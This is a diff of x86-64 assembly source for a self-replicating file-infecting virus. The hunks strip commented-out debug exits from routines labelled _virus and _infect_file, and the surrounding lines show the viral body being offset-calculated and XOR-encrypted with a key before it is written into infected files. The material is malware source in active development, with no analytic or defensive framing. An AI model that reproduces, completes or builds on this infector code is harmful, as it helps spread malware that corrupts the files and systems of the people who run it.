@@ -125,9 +125,6 @@ _h3ll0w0rld:
 
 		jmp _prg
 
-; = DEBUG
-;		jmp _virus
-; =
 		.gandalf:; 2 byte then [debug_msg db `DEBUGGING..\n`, 0x0]
 			mov rax, 0x4e49474755424544
 			db `G..\n`, 0x0
@@ -228,11 +225,6 @@ _virus:
 	pop rax
 	syscall
 	pop rdx
-
-; = DEBUG
-;	mov rax, 60
-;	syscall
-; =
 
 	call _exit
 
@@ -661,10 +653,6 @@ _infect_file: ; (string rdi, stat rsi)
 			add rdx, 8 * 3
 
 			.params:
-; = DEBUG
-;	mov rax, 60
-;	syscall
-; =
 			sub rax, 8 * 3
 
 			push rdi
@@ -675,18 +663,12 @@ _infect_file: ; (string rdi, stat rsi)
 			lea rcx, [rel _params]
 			sub rax, rcx
 			add rdi, rax
-;			lea rdi, [rel _virus]; => NON
 			lea rcx, [rel _virus]
 			lea rsi, [rel _params]
 			sub rcx, rsi
 			mov rsi, rdx; [rel length]
 			push rdx
 			sub rsi, rcx ; length - (_virus - _params)
-; = DEBUG
-;			mov rdi, rsi
-;			mov rax, 60
-;			syscall
-; =
 			lea rdx, [rel _h3ll0w0rld]
 			mov rcx, KEY_SIZE
 			call _xor_encrypt
@@ -694,10 +676,6 @@ _infect_file: ; (string rdi, stat rsi)
 			pop rax
 			pop rcx
 			pop rdi
-; = DEBUG
-;	mov rax, 60
-;	syscall
-; =
 
 			; add _params
 			mov [rax], rdx ; length
